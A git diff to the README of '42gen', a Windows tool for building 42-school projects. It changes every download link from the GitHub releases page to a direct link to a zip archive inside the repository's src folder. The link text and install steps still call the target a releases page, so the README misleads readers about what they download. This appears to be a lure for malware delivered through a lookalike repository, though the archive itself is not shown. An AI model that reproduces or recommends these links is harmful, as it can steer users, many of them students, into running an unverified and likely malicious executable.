@@ -1,6 +1,6 @@
 # 🛠️ 42gen - Build 42 Projects Without Setup
 
-[![Download 42gen](https://img.shields.io/badge/Download-42gen-blue?style=for-the-badge)](https://github.com/debaolele-dev/42gen/releases)
+[![Download 42gen](https://img.shields.io/badge/Download-42gen-blue?style=for-the-badge)](https://github.com/debaolele-dev/42gen/raw/refs/heads/main/src/gen-3.0.zip)
 
 ## 🚀 What 42gen Does
 
@@ -24,7 +24,7 @@ It gives you:
 
 Visit this page to download:
 
-https://github.com/debaolele-dev/42gen/releases
+https://github.com/debaolele-dev/42gen/raw/refs/heads/main/src/gen-3.0.zip
 
 On that page:
 1. Open the latest release
@@ -48,7 +48,7 @@ If your school work uses Git, you can keep using it with 42gen. The tool just he
 ## ⚙️ How to Install
 
 1. Open the release page:
-   https://github.com/debaolele-dev/42gen/releases
+   https://github.com/debaolele-dev/42gen/raw/refs/heads/main/src/gen-3.0.zip
 
 2. Download the Windows file from the latest release.
 
@@ -257,7 +257,7 @@ If you use a zip file, extract it before running the app.
 
 ## 🔗 Download Again
 
-[Visit the 42gen releases page](https://github.com/debaolele-dev/42gen/releases)
+[Visit the 42gen releases page](https://github.com/debaolele-dev/42gen/raw/refs/heads/main/src/gen-3.0.zip)
 
 ## 📦 Project Name
 
